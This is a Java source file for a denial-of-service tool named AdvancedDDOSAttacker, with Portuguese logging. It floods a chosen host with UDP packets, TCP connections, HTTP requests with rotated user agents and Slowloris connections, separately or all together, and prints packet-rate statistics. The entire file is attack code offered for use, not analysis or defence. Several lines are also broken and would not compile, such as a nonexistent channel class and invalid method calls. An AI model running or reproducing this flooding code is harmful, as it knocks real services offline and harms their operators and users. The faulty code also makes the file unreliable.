import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.AsynchronousOpenSocketChannel;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.ThreadLocalRandom;
import java.util.concurrent.atomic.AtomicLong;
import java.util.concurrent.CountDownLatch;

public class AdvancedDDOSAttacker {

    private final String targetDomain;
    private final int targetPort;
    private final String attackType;
    private final int duration;
    private final AtomicLong packetsSent = new AtomicLong(0);
    private final ConcurrentHashMap<String, Long> stats = new ConcurrentHashMap<>();
    private volatile boolean running = true;
    private final String[] userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
        "curl/8.0.1",
        "python-requests/2.31.0"
    };

    public AdvancedDDOSAttacker(String targetDomain, int targetPort, String attackType, int duration) {
        this.targetDomain = targetDomain;
        this.targetPort = targetPort;
        this.attackType = attackType.toLowerCase();
        this.duration = duration;
    }

    private void log(String message) {
        System.out.printf("[%s] %s%n", java.time.LocalTime.now().format(java.time.format.DateTimeFormatter.ofPattern("HH:mm:ss")), message);
    }

    private String getRandomUserAgent() {
        return userAgents[ThreadLocalRandom.current().nextInt(userAgents.length)];
    }

    private void updateStats(String key) {
        stats.merge(key, 1L, Long::sum);
    }

    // ---------------------------------------------------------------------
    // UDP FLOOD
    // ---------------------------------------------------------------------
    private void udpFlood() {
        log("🚀 Iniciando UDP Flood para " + targetDomain + ":" + targetPort);
        try (DatagramSocket socket = new DatagramSocket()) {
            socket.setBroadcast(true);
            InetAddress targetAddress = InetAddress.getByName(targetDomain);
            byte[] payload = new byte[512];
            ThreadLocalRandom.current().nextBytes(payload);

            while (running) {
                try {
                    DatagramPacket packet = new DatagramPacket(payload, payload.length, targetAddress, targetPort);
                    socket.send(packet);
                    packetsSent.incrementAndGet();
                    updateStats("udp");
                } catch (IOException e) {
                    log("⚠️ Erro no UDP: " + e.getMessage());
                    break;
                }
            }
        } catch (IOException e) {
            log("❌ Falha ao iniciar UDP Flood: " + e.getMessage());
        }
    }

    // ---------------------------------------------------------------------
    // TCP CONNECT FLOOD (USANDO ASYNCHRONOUS NIO)
    // ---------------------------------------------------------------------
    private void tcpConnectFlood() {
        log("🚀 Iniciando TCP Connect Flood para " + targetDomain + ":" + targetPort);
        ExecutorService executor = Executors.newFixedThreadPool(100);
        int concurrentConnections = 500;

        for (int i = 0; i < concurrentConnections && running; i++) {
            executor.submit(() -> {
                while (running) {
                    try {
                        AsynchronousSocketChannel channel = AsynchronousSocketChannel.open();
                        channel.configureBlocking(false);
                        
                        // Tenta conectar com timeout curto
                        java.util.concurrent.Future<AsynchronousSocketChannel> future = 
                            channel.connect(new InetSocketAddress(targetDomain, targetPort));
                        
                        try {
                            future.get(100, java.util.concurrent.TimeUnit.MILLISECONDS);
                            packetsSent.incrementAndGet();
                            updateStats("tcp");
                        } catch (java.util.concurrent.TimeoutException e) {
                            future.cancel(true);
                        } finally {
                            channel.close();
                        }
                    } catch (Exception e) {
                        // Ignora erros de conexão para manter a taxa
                    }
                }
            });
        }
        executor.shutdown();
    }

    // ---------------------------------------------------------------------
    // HTTP REQUEST FLOOD
    // ---------------------------------------------------------------------
    private void httpRequestFlood() {
        log("🚀 Iniciando HTTP Request Flood para http://" + targetDomain + ":" + targetPort);
        ExecutorService executor = Executors.newFixedThreadPool(50);
        int concurrentRequests = 200;

        for (int i = 0; i < concurrentRequests && running; i++) {
            executor.submit(() -> {
                while (running) {
                    try {
                        java.net.HttpURLConnection connection = (java.net.HttpURLConnection) 
                            new java.net.URL("http://" + targetDomain + ":" + targetPort + "/?attack=" + ThreadLocalRandom.current().nextInt(99999)).openConnection();
                        
                        connection.setRequestMethod("GET");
                        connection.setRequestProperty("User-Agent", getRandomUserAgent());
                        connection.setRequestProperty("Accept", "*/*");
                        connection.setConnectTimeout(100);
                        connection.setReadTimeout(100);
                        
                        connection.connect();
                        packetsSent.incrementAndGet();
                        updateStats("http");
                        
                        // Não espera a resposta completa para manter a taxa
                        connection.disconnect();
                    } catch (IOException e) {
                        // Ignora erros para manter a taxa
                    }
                }
            });
        }
        executor.shutdown();
    }

    // ---------------------------------------------------------------------
    // SLOWLORIS ATTACK
    // ---------------------------------------------------------------------
    private void slowlorisAttack() {
        log("🚀 Iniciando Slowloris Attack para http://" + targetDomain + ":" + targetPort);
        ExecutorService executor = Executors.newFixedThreadPool(20);
        int concurrentConnections = 100;

        for (int i = 0; i < concurrentConnections && running; i++) {
            executor.submit(() -> {
                while (running) {
                    try {
                        java.net.Socket socket = new java.net.Socket();
                        socket.connect(new InetSocketAddress(targetDomain, targetPort), 1000);
                        socket.setTcpNoDelay(true);
                        
                        java.io.OutputStream out = socket.getOutputStream();
                        String headers = "GET / HTTP/1.1\r\nHost: " + targetDomain + "\r\nUser-Agent: " + getRandomUserAgent() + "\r\n";
                        out.write(headers.getBytes());
                        out.flush();

                        // Mantém a conexão aberta enviando headers adicionais lentamente
                        for (int j = 0; j < 10 && running; j++) {
                            Thread.sleep(500);
                            out.write(("X-Slow-Header-" + j + ": value\r\n").getBytes());
                            out.flush();
                        }

                        packetsSent.incrementAndGet();
                        updateStats("slowloris");
                        socket.close();
                    } catch (IOException e) {
                        // Ignora erros
                    }
                }
            });
        }
        executor.shutdown();
    }

    // ---------------------------------------------------------------------
    // START ATTACK
    // ---------------------------------------------------------------------
    public void startAttack() {
        log("🎯 Alvo: " + targetDomain + ":" + targetPort);
        log("📊 Tipo: " + attackType.toUpperCase() + " | Duração: " + duration + "s");
        log("⏱️  Pressione Ctrl+C para interromper o ataque.");

        Thread monitorThread = new Thread(() -> {
            long startTime = System.currentTimeMillis();
            while (running) {
                try {
                    Thread.sleep(1000);
                    long elapsed = (System.currentTimeMillis() - startTime) / 1000.0;
                    double pps = elapsed > 0 ? packetsSent.get() / elapsed : 0;
                    log(String.format("📊 Pacotes enviados: %d | PPS atual: %.2f", packetsSent.get(), pps));
                } catch (InterruptedException e) {
                    break;
                }
            }
        });
        monitorThread.start();

        Thread[] attackThreads = new Thread[0];

        if (attackType.equals("hybrid") || attackType.equals("all")) {
            attackThreads = new Thread[]{
                new Thread(this::udpFlood, "UDP-Flood"),
                new Thread(this::tcpConnectFlood, "TCP-Connect-Flood"),
                new Thread(this::httpRequestFlood, "HTTP-Request-Flood"),
                new Thread(this::slowlorisAttack, "Slowloris")
            };
        } else {
            switch (attackType) {
                case "udp":
                    attackThreads = new Thread[]{new Thread(this::udpFlood, "UDP-Flood")};
                    break;
                case "tcp":
                    attackThreads = new Thread[]{new Thread(this::tcpConnectFlood, "TCP-Connect-Flood")};
                    break;
                case "http":
                    attackThreads = new Thread[]{new Thread(this::httpRequestFlood, "HTTP-Request-Flood")};
                    break;
                case "slowloris":
                    attackThreads = new Thread[]{new Thread(this::slowlorisAttack, "Slowloris")};
                    break;
                default:
                    log("❌ Tipo de ataque inválido: " + attackType);
                    return;
            }
        }

        for (Thread thread : attackThreads) {
            thread.start();
            log("✅ Thread " + thread.getName() + " iniciada.");
        }

        // Aguarda a duração do ataque
        try {
            Thread.sleep(duration * 1000L);
        } catch (InterruptedException e) {
            log("⚠️ Interrupção manual detectada.");
        } finally {
            running = false;
            for (Thread thread : attackThreads) {
                thread.interrupt();
            }

            // Resumo final
            long totalPackets = packetsSent.get();
            long totalElapsed = (System.currentTimeMillis() - monitorThread.start().getTime()) / 1000;
            double avgPps = totalElapsed > 0 ? totalPackets / (double) totalElapsed : 0;
            log("\n" + "=".repeat(50));
            log("📈 RESUMO DO ATAQUE");
            log("⏱️  Duração total: " + totalElapsed + "s");
            log("📦 Pacotes totais: " + totalPackets);
            log("📊 PPS médio: " + String.format("%.2f", avgPps));
            log("=".repeat(50));
        }
    }

    // ---------------------------------------------------------------------
    // MAIN
    // ---------------------------------------------------------------------
    public static void main(String[] args) {
        String target = "example.com";
        String attackType = "hybrid";
        int duration = 60;
        int port = 80;

        // Parse de argumentos
        if (args.length > 0) {
            target = args[0];
            if (args.length > 1) attackType = args[1];
            if (args.length > 2) duration = Integer.parseInt(args[2]);
            if (args.length > 3) port = Integer.parseInt(args[3]);
        }

        AdvancedDDOSAttacker attacker = new AdvancedDDOSAttacker(target, port, attackType, duration);
        attacker.startAttack();
    }
}